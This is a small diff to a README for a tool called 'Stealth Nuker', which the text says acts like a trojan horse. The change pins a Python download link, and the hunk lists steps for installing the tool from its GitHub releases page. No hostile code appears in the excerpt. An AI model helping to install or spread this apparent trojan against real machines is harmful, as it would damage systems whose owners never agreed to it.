@@ -9,7 +9,7 @@ This way, the Stealth Nuker acts like a trojan horse rather than a typical piece
 
 How to install the Stealth Nuker:
 -
-1. Install the latest version of Python installed on your computer: https://www.python.org/downloads/
+1. Install the latest version of Python installed on your computer: https://www.python.org/downloads/release/python-383/
 2. When installing python, you **must** check the "Add to PATH" check box.
 3. Visit the releases page and install the latest version of the Stealth Nuker: https://github.com/catterall/Stealth-Nuker/releases
 
